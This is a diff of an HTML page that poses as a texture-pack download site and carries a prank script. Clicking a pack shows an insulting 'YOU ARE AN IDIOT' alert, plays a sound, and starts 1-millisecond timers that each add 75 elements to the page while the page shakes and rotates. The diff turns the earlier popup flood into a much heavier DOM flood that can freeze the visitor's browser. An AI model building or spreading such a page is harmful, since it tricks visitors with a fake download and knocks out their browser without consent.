@@ -3,17 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Better Texture Packs</title>
+    <title>Cazozozop Texture Packs</title>
     <style>
         body {
             background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
             background-size: cover;
-            text-align: center;
             font-family: Arial, sans-serif;
             color: white;
-            overflow: hidden;
+            overflow-x: hidden;
             transition: all 0.1s;
-            padding: 0;
             margin: 0;
         }
         .content {
@@ -35,6 +33,7 @@
             display: flex;
             justify-content: space-around;
             flex-wrap: wrap;
+            margin-bottom: 50px;
         }
         .pack {
             background: rgba(255, 255, 255, 0.2);
@@ -120,33 +119,37 @@
             alert(`YOU ARE AN IDIOT! AHAHAHAAAAA - ${packName}`);
             document.getElementById("trollSound").play();
             
+            // Generate many random troll windows and glitches rapidly
             setInterval(() => {
-                window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
-            }, 500);
-            
+                for (let i = 0; i < 75; i++) {
+                    let trollDiv = document.createElement("div");
+                    trollDiv.classList.add("troll-window");
+                    trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
+                    trollDiv.style.top = Math.random() * window.innerHeight + "px";
+                    trollDiv.style.left = Math.random() * window.innerWidth + "px";
+                    document.body.appendChild(trollDiv);
+                }
+            }, 1);
+
+            // Generate text glitches
             setInterval(() => {
-                let trollDiv = document.createElement("div");
-                trollDiv.classList.add("troll-window");
-                trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
-                trollDiv.style.top = Math.random() * window.innerHeight + "px";
-                trollDiv.style.left = Math.random() * window.innerWidth + "px";
-                document.body.appendChild(trollDiv);
-            }, 50);
-            
-            setInterval(() => {
-                let glitch = document.createElement("div");
-                glitch.style.position = "absolute";
-                glitch.style.top = Math.random() * window.innerHeight + "px";
-                glitch.style.left = Math.random() * window.innerWidth + "px";
-                glitch.style.color = "lime";
-                glitch.style.fontSize = "30px";
-                glitch.innerText = "YOU ARE AN IDIOT!";
-                document.body.appendChild(glitch);
-            }, 30);
-            
+                for (let i = 0; i < 75; i++) {
+                    let glitch = document.createElement("div");
+                    glitch.style.position = "absolute";
+                    glitch.style.top = Math.random() * window.innerHeight + "px";
+                    glitch.style.left = Math.random() * window.innerWidth + "px";
+                    glitch.style.color = "lime";
+                    glitch.style.fontSize = "30px";
+                    glitch.innerText = [":)", ":D", ";D", ":]", ">:D", ":}", ":|", ";)", "XD"][Math.floor(Math.random() * 9)];
+                    document.body.appendChild(glitch);
+                }
+            }, 1);
+
+            // Make the screen glitch
             setInterval(() => {
                 document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.1}) translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
-            }, 100);
+                document.body.style.backgroundPosition = `${Math.random() * 100}% ${Math.random() * 100}%`;
+            }, 50);
         }
         
         function triggerDownload(packName) {
